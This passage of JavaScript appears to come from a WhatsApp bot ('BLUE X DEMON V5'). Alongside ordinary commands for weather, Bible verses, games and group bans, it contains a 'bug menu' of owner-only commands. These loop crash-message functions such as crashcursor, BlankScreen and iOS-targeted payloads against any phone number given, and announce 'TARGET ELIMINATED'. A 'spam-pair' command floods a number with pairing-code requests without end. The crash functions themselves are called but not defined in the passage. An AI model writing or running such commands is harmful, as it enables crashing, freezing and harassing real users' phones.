case 'sound94':
case 'sound95': {
    try {
        await loading();
        
        const url = `https://github.com/anonphoenix007/phonk-api/raw/main/all/${command}.mp3`;
        const reslt = await getBuffer(url);
        
        // Send the audio as a voice note
        await conn.sendMessage(m.chat, { 
            audio: reslt, 
            mimetype: 'audio/mp4', 
            ptt: true 
        }, { quoted: m });
        
        // Send the caption after the audio
        await conn.sendMessage(m.chat, { 
            text: fontx(`> ${caption}`)
        }, { quoted: m });
    } catch (error) {
        console.error(`Error in ${command} case:`, error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'rps': {
    if (!q) return reply(`Please choose one: rock, paper, or scissors.\nExample: ${prefix}rps rock`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['rock', 'paper', 'scissors'];
    if (!validChoices.includes(userChoice)) {
        return reply("Invalid choice. Please choose 'rock', 'paper', or 'scissors'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result, imageUrl;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'rock' && botChoice === 'scissors') ||
        (userChoice === 'paper' && botChoice === 'rock') ||
        (userChoice === 'scissors' && botChoice === 'paper')
    ) {
        result = "```You win! ```🎉";
    } else {
        result = "```You lose! 😢```";
    }
    if (userChoice === 'rock' && botChoice === 'paper') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/rockandpaper.jpg';
    } else if (userChoice === 'paper' && botChoice === 'scissors') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/paperandscissor.jpg';
    } else if (userChoice === 'rock' && botChoice === 'scissors') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/rockandscissors.jpg';
    }

    // Send the result
    await conn.sendMessage(from, {
        image: { url: imageUrl || '' },
        caption: `🤖 *Rock, Paper, Scissors*\n\nYou chose: ${userChoice}\nI chose: ${botChoice}\n\n*Result:* ${result}`,
    }, { quoted: m });

    break;
}
case 'get': {
    if (!q) return reply("Please provide a valid link to fetch.");
    const isValidUrl = (url) => {
        try {
            new URL(url);
            return true;
        } catch (err) {
            return false;
        }
    };

    if (!isValidUrl(q)) return reply("Invalid URL. Please provide a proper link.");

    try {
        await loading();
        const response = await fetch(q);
        if (!response.ok) {
            return reply(`Failed to fetch the link. Server responded with status: ${response.status}`);
        }

        const html = await response.text();
        const maxLength = 70000;
        const output = html.length > maxLength 
            ? html.slice(0, maxLength) + `\n\n*Output truncated. Full content exceeds ${maxLength} characters.*` 
            : html;

        reply(`*HTML Content of the Link:*\n\n${output}`);
    } catch (error) {
        console.error("Error in get case:", error);
        reply("An error occurred while fetching the link. Please try again later.");
    }
    break;
}
case 'ban': case 'suspend': {
    if (!isGroup) return reply(mess.only.group)
    if (!isOwner && !isAdmins) return reply(mess.only.admin);
    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
    await loading();
    let target = mentionByReply ? quoted.sender : mentionByTag[0];
    if (!target) return reply('`No target detected`\n*Reply or tag the person*');
    const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    const entry = {
        number: target,
        groupJid: isGroup ? m.chat : null
    };

    if (banData.some(ban => ban.number === entry.number && ban.groupJid === entry.groupJid)) {
        return reply('this user is already banned.');
    }

    banData.push(entry);
    fs.writeFileSync('./database/banned.json', JSON.stringify(banData, null, 2));
    reply(`user banned from chatting on the group \nnumber: ${entry.number}\ngroup: ${entry.groupJid || 'N/A'}`);
}
break;
case 'unban': case 'unsuspend': {
    if (!isGroup) reply(mess.only.group)
    if (!isOwner && !isAdmins) return reply(mess.only.admin);
    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
    await loading();
    let target = mentionByReply ? quoted.sender : mentionByTag[0];
    if (!target) return reply('`No target detected`\n*Reply or tag the person*');
    const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    const index = banData.findIndex(ban => ban.number === target && (!ban.groupJid || ban.groupJid === m.chat));
    if (index === -1) return reply('this user hasn\'t been banned');
    banData.splice(index, 1);
    fs.writeFileSync('./database/banned.json', JSON.stringify(banData, null, 2));

    reply(`user has been unban from sending message on this group.\nnumber: ${target}\ngroup: ${isGroup ? m.chat : 'N/A'}`);
}
break;
case 'listban': {
    if (!isGroup) return reply(mess.only.group);
    if (!isOwner && !isAdmins) return reply(mess.only.admin);

    await loading();
    
    const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    const groupBans = banData.filter(ban => ban.groupJid === m.chat);

    if (groupBans.length === 0) return reply('No users are banned in this group.');

    let banList = `*Banned Users in this Group:*\n\n`;
    groupBans.forEach((ban, index) => {
        banList += `${index + 1}. @${ban.number.replace('@s.whatsapp.net', '')}\n`;
    });

    reply(banList, { mentions: groupBans.map(ban => ban.number) });

    break;
}
case 'text2pdf': {
    if (!q) return reply(`\`No text detected\`\n*Example:  ${prefix + command} text*`);

    try {
        await loading();
        const apiUrl = `https://bk9.fun/tools/pdf?q=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`Failed to fetch PDF. Status: ${response.status}`);

        const buffer = await response.buffer();
        await conn.sendMessage(m.chat, {
            document: buffer,
            mimetype: 'application/pdf',
            fileName: 'text2pdf.pdf',
            caption: fontx(`Here is your PDF file for the provided text.\n> ${caption}`)
        }, { quoted: m });

    } catch (error) {
        console.error("Error in text2pdf case:", error);
        reply("An error occurred while converting the text to a PDF. Please try again later.");
    }
    break;
}
case 'xmasfact': {
    try {
        await loading();
        const apiUrl = `https://christmasjoy.dev/api/facts`;
        const response = await fetch(apiUrl);
        const facts = await response.json();
        if (!Array.isArray(facts) || facts.length === 0) {
            return reply("No Christmas facts found. Please try again later.");
        }
        const randomFact = facts[Math.floor(Math.random() * facts.length)];
        reply(`🎄 *Christmas Fact:* 🎅\n\n${randomFact}`);
    } catch (error) {
        console.error("Error in xmasfact case:", error);
        reply("An error occurred while fetching a Christmas fact. Please try again later.");
    }
    break;
}
case 'zoro': {
 await loading();
    const randomImage = zoroImages[Math.floor(Math.random() * zoroImages.length)];
    try {
        await conn.sendMessage(from, {
            image: { url: randomImage },
            caption: fontx(`> ${caption}`)
        }, { quoted: m });
    } catch (error) {
        console.error('Error sending Zoro image:', error);
        reply('An error occurred while fetching the Zoro wallpaper. Please try again later.');
    }

    break;
}
case 'say2': case 'tts2': {
    if (!q) return reply(`\`Please provide text to convert to speech.\`\n\n*Example:*\n${prefix + command} hello`);

    try {
        await loading();
        const apiUrl = `https://api.davidcyriltech.my.id/tts?text=${encodeURIComponent(q)}&voice=Bianca`;
        const response = await fetch(apiUrl);
        const json = await response.json();
        if (!json.success || json.status !== 200 || !json.audioUrl) {
            return reply('Failed to generate TTS audio. Please try again later.');
        }
        await conn.sendMessage(m.chat, {
            audio: { url: json.audioUrl },
            mimetype: 'audio/mp4',
            fileName: 'tts-audio.mp3',
        }, { quoted: m });

    } catch (error) {
        console.error('Error in say2 case:', error);
        reply('An error occurred while processing your request. Please try again later.');
    }

    break;
}
case 'weather': {
    if (!q) return reply('Please provide a location to check the weather.\n\n*Example:* .weather Lagos');

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.davidcyriltech.my.id/weather?city=${encodeURIComponent(q)}`;

        // Fetch the weather data
        const response = await fetch(apiUrl);
        const json = await response.json();

        // Validate the API response
        if (!json.success || !json.data) {
            return reply('Failed to fetch weather data. Please try again later.');
        }

        const { location, country, weather, description, temperature, feels_like, pressure, humidity, wind_speed, coordinates } = json.data;

        // Construct the message
        const weatherInfo = `🌤️ *Weather Report*\n\n📍 *Location*: ${location}, ${country}\n☁️ *Weather*: ${weather} (${description})\n🌡️ *Temperature*: ${temperature}\n🥵 *Feels Like*: ${feels_like}\n🌬️ *Wind Speed*: ${wind_speed}\n💧 *Humidity*: ${humidity}\n🗺️ *Coordinates*: Lat ${coordinates.latitude}, Lon ${coordinates.longitude}\n🔍 *Pressure*: ${pressure}`;

        // Send the weather info with the image
        await conn.sendMessage(m.chat, {
            image: { url: './temp/blueimages/weather.jpg' },
            caption: weatherInfo,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in weather case:', error);
        reply('An error occurred while fetching the weather. Please try again later.');
    }

    break;
}
    case 'bible': {
    if (!q) return reply('Please provide a Bible reference.\n\n*Example:* .bible John 3:16');

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.davidcyriltech.my.id/bible?reference=${encodeURIComponent(q)}`;

        // Fetch the Bible verse
        const response = await fetch(apiUrl);
        const json = await response.json();

        // Validate the API response
        if (!json.success || !json.text) {
            return reply('Failed to fetch the Bible verse. Please check the reference and try again.');
        }

        const { reference, translation, text } = json;

        // Construct the message
        const bibleInfo = `📖 *Bible Verse*\n\n📜 *Reference*: ${reference}\n📚 *Translation*: ${translation}\n\n🕊️ *Verse Text*:\n${text.trim()}`;

        // Send the Bible verse with the image
        await conn.sendMessage(m.chat, {
            image: { url: './temp/blueimages/bible.jpg' },
            caption: bibleInfo,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in bible case:', error);
        reply('An error occurred while fetching the Bible verse. Please try again later.');
    }

    break;
} 
case 'getdevice':
case 'device':
case 'phone': {
    if (!m.quoted) return reply(`Please reply to a chat message with *${prefix + command}* to get device information.`);
    try {
        await loading();
        const deviceInfo = await getDevice(m.quoted.id || m.key.id);
        if (!deviceInfo) return reply("Unable to fetch device information. Please try again later.");
        await conn.sendMessage(m.chat, {
            text: fontx(`📱 *\`device type\`* *${deviceInfo}*`),
        }, { quoted: m });
    } catch (error) {
        reply("An error occurred while fetching the device information. Please try again later.");
    }
    break;
}
case 'getcase': {
    if (!isOwner) return reply(mess.only.owner);
    if (!args[0]) return reply('Please specify the case name to retrieve.');

    const caseName = args[0].toLowerCase();
    const caseFilePath = './message/case.js';

    try {
        const caseFileContent = fs.readFileSync(caseFilePath, 'utf8');
        const caseRegex = new RegExp(`case ['"]${caseName}['"]:(.*?)break;`, 's');
        const match = caseFileContent.match(caseRegex);

        if (match && match[0]) {
            const caseCode = match[0];
            await conn.sendMessage(m.chat, {
                text: `*Case Name:* \`${caseName}\`\n\n\`\`\`${caseCode}\`\`\``,
            }, { quoted: m });
        } else {
            await conn.sendMessage(m.chat, {
                text: `Case \`${caseName}\` not found.`,
            }, { quoted: m });
        }
    } catch (error) {
        console.error('Error reading case.js:', error);
        await conn.sendMessage(m.chat, {
            text: 'An error occurred while retrieving the case. Please check the server logs.',
        }, { quoted: m });
    }

    break;
}
case 'setprefix': {
    if (!isOwner) return reply(mess.only.owner);

    if (!text) return reply("Please provide a new prefix.\n\nExample: `.setprefix !`");
   await loading()
    try {
        fs.writeFileSync(prefixFile, JSON.stringify({ prefix: text }, null, 2));
        prefix = text;
        reply(`✅ Prefix successfully changed to: *${text}*`);
    } catch (error) {
        console.error('Error saving new prefix:', error);
        reply("❌ Failed to update the prefix.");
    }

    break;
}
case 'getprefix': {
    await loading();

    try {
        const prefixData = JSON.parse(fs.readFileSync('./database/prefix.json', 'utf8'));
        const currentPrefix = prefixData.prefix || '.';

        reply(`*Current Prefix:* \`${currentPrefix}\``);
    } catch (error) {
        console.error('Error reading prefix file:', error);
        reply('Failed to retrieve prefix.');
    }
    break;
}
case 'antilink': {
    if (!isGroup) return reply(mess.only.group)
    if (!isGroupAdmins && !isOwner) return reply(mess.only.admin) // Check if the user is a group admin or owner
    await loading()
    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
        if (isAntiLink) return reply('the feature is already active.')
        db.data.chats[from].antilink = true
        let ih = `the antilink feature has been activated.`
        reply(ih)
    } else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!isAntiLink) return reply('the antilink feature is already off.')
        db.data.chats[from].antilink = false
        let ih = `the antilink feature has been deactivated.`
        reply(ih)
    } else if (!q) {
        reply(`*anti link mode*\n ${prefix + command} on/off`)
    }
}
break;
case 'devil': {  
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);
if (!q) return reply(`Example: ${prefix + command} 234###`)    
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"     
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await crashcursor(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await bugnew(target, Ptcp = true)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'void': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()   
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"     
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await crashcursor(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await buginvite(target, Ptcp = true)
await buginvite(target, Ptcp = true)
await systemUi(target, Ptcp = true)
await systemUi(target, Ptcp = true)
await XeonXRobust(target, ptcp = true)
await XeonXRobust(target, ptcp = true)
await XeonXRobust(target, ptcp = true)
await crashcursor(target, Ptcp = true)
await bugnew(target, Ptcp = true)
await crashcursor(target, Ptcp = true)
await bugnew(target, Ptcp = true)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'null': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);
if (!q) return reply(`Example: ${prefix + command} 234###`)    
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"     
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await XeonXRobust(target, ptcp = true)
await bugnew(target, ptcp = true)
await Fuckui(target)
await InvisibleLoadFast(target)
await mati2(target)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'dojutsu': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);
if (!q) return reply(`Example: ${prefix + command} 234###`)    
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"     
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await hardfreeze(target, ptcp = true)
await betacrash(target, ptcp = true)
await BlankScreen(target, Ptcp = true)
await crashcursor(target, ptcp = true)
await InfiNite(target, Ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
await crashcursor(target, ptcp = true)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
 case 'betai': case 'betax':    
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);
await loadingx()  
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
     for (let i = 0; i < 10; i++) {
    await crashcursor(m.chat, Ptcp = true)
    await InfiNite(m.chat, cct = true, ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await BlankScreen(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await systemUi(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await XeonXRobust(m.chat, ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await freezefile1(m.chat, ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await buginvite(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await systemUi(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
    await crashcursor(m.chat, Ptcp = true)
     }
     reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
break;
 case 'xbeta': 
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
     for (let i = 0; i < 10; i++) {
    await crashcursor(target, Ptcp = true)
    await InfiNite(target, cct = true, ptcp = true)
    await crashcursor(target, Ptcp = true)
    await BlankScreen(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await systemUi(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await XeonXRobust(target, ptcp = true)
    await crashcursor(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await buginvite(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await systemUi(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
    await crashcursor(target, Ptcp = true)
     }
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
break;
case 'dead-ios': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await SmCrash(target)
await AppXCrash(target)
await VenCrash(target)
await UpiCrash(target)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'fake-ios': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await QPayIos(target)
await caywzzaja_notif(target)
await QXIphone(target)
await FBiphone(target)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'sharingan': 
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
await loadingx()  
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
     for (let i = 0; i < 10; i++) {
    await mati2(m.chat, Ptcp = true)
    await mati2(m.chat, cct = true, ptcp = true)
    await mati2(m.chat, Ptcp = true)
    await bugnew(m.chat, Ptcp = true)
    await SendPairingr(m.chat, Ptcp = false)
    await mati2(m.chat, Ptcp = true)
     }
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
break;
case 'spam-pair': {
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
let target = q.replace(/[^0-9]/g, '').trim()
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()

let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (;;) {
for (let i = 0; i < 48; i++) {
await sleep(1000)
let prc = await sucked.requestPairingCode(target)
await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
}
await sleep(15000)
}
}
break;
case 'xios': {
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 10; i++) {
        await XeonIosNew(target)
        await XeonIosPayOld(target)
        await XeonIosOld(target)
        await crashcursor(target)
        await crashcursor(target)
        await XeonIosNew(target)
        await XeonIosPayOld(target)
    }
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'xeo-ios': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await XiosVirus(target)
await IosMJ(target, Ptcp = true)
await QDIphone(target)
await QPayStriep(target)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'xpayios': {             
if (!isOwner) return reply(mess.only.owner)           
if (!isVip) return reply(mess.only.vip);  
if (!q) return reply(`Example: ${prefix + command} 234###`)
await loadingx()  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"    
reply(`🕸️ 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
for (let i = 0; i < 20; i++) {
await SmCrash(target)
await AppXCrash(target)
await VenCrash(target)
await UpiCrash(target)
await SmCrash(target)
await AppXCrash(target)
await VenCrash(target)
await UpiCrash(target)
await QPayIos(target)
await caywzzaja_notif(target)
await QXIphone(target)
await FBiphone(target)
await XiosVirus(target)
await IosMJ(target, Ptcp = true)
await QDIphone(target)
await QPayStriep(target)
}
reply(`𝐓𝐀𝐑𝐆𝐄𝐓 𝐄𝐋𝐈𝐌𝐈𝐍𝐀𝐓𝐄𝐃 🩸
🕸️ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
🕸️ 𝐔𝐒𝐈𝐍𝐆 : ${command}`)
}
break;
case 'bugmenu': {
    await loading();
    const randomImage = images[Math.floor(Math.random() * images.length)];

    conn.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: fontx(`『 𝐁𝐋𝐔𝐄 𝐗 𝐃𝐄𝐌𝐎𝐍 𝐕𝟓 』\n> *𓃠*\`\`\`NAME : ${pushname}\`\`\`
> *𓃠*\`\`\`STATUS : ${isPremium ? '𝙿𝚛𝚎𝚖𝚒𝚞𝚖' : '𝙵𝚛𝚎𝚎'}\`\`\`
> *𓃠*\`\`\`MODE : ${publik ? '𝙿𝚞𝚋𝚕𝚒𝚌' : '𝚂𝚎𝚕𝚏'}\`\`\`
> *𓃠*\`\`\`PREFIX : ${prefix}\`\`\`
> *𓃠*\`\`\`VIP : ${isVip ? '𝚝𝚛𝚞𝚎' : '𝚏𝚊𝚕𝚜𝚎'}\`\`\`\n
> ─『 \`𝐁𝐔𝐆 𝐌𝐄𝐍𝐔\` 』
> ⧎ betax [dm]
> ⧎ betai [dm]
> ⧎ sharingan [dm]
> ⧎ devil 234##
> ⧎ void 234##
> ⧎ null 234##
> ⧎ dojutsu 234##
> ⧎ xbeta 234###
> ⧎ xios 234##
> ⧎ xpayios 234##
> ⧎ dead-ios 234##
> ⧎ fake-ios 234##
> ⧎ xeo-ios 234##
> ⧎ spam-pair 234##
> ─────────────❐`)
    });
    break;
}
                           default:
 
                    conn.ev.on('messages.upsert', async (chatUpdate) => {
    if (!chatUpdate.messages) return;
    const m = chatUpdate.messages[0];

    if (m.key.fromMe || !m.key.remoteJid.endsWith('@g.us')) return;

    const bannedUsers = global.db.data.banned[m.key.remoteJid];
    if (bannedUsers && bannedUsers.includes(m.sender)) {
        await conn.sendMessage(m.key.remoteJid, { delete: m.key });
    }
});
            }
            if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {} else if (!isGroup && user && isPremium && !itsMe) {
                reply(`${ucapanWaktu} *${pushname}*  how can i help you? please type *${prefix}menu*`)
                user.pc = new Date * 1
            }
if (global.badword === true && bad.some(word => budy.toLowerCase().includes(word.toLowerCase()))) {
    if (cekSpam("NotCase", senderNumber, AntiSpam)) return;

    addSpam("NotCase", senderNumber, "10s", AntiSpam);

    if (isGroup) {
        if (isBotGroupAdmins) {
            await conn.sendMessage(from, {
                delete: {
                    remoteJid: from,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender,
                },
            });

            await conn.sendMessage(from, {
                text: `*Warning: Badwords are prohibited in this group.*\nYour message has been deleted.`,
            }, { quoted: m });
        } else {
            await conn.sendMessage(from, {
                text: `*Warning: Badwords are prohibited in this group.*\nI don't have admin privileges to delete the message.`,
            }, { quoted: m });
        }
    } else {
        await conn.sendMessage(from, {
            text: `*Warning: Badwords are prohibited.*\nPlease refrain from using inappropriate language.`,
        }, { quoted: m });
    }
}
        } catch (err) {
            console.log(err)
            if (isCmd) Failed(toFirstCase(command), dash)
            let e = util.format(err)
            if (err.message.includes("Cannot find module")) {
                let module = err.message.split("Cannot find module '")[1].split("'")[0]
                let teks = `Module ${module} has not been installed
Please install it first`
